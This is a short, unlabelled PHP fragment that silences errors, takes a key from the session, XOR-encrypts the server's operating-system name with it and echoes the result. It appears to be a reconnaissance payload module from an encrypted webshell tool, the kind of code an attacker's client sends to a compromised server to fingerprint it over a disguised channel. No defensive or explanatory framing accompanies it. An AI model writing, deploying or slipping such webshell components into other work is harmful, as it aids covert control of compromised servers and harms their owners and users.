error_reporting(0);
function main() {
    session_start();
    $key=$_SESSION['k'];
    echo encrypt(PHP_OS, $key);
}

function encrypt($data,$key)
{
	for($i=0;$i<strlen($data);$i++) {
    	$data[$i] = $data[$i]^$key[$i+1&15]; 
    }
	return $data;
}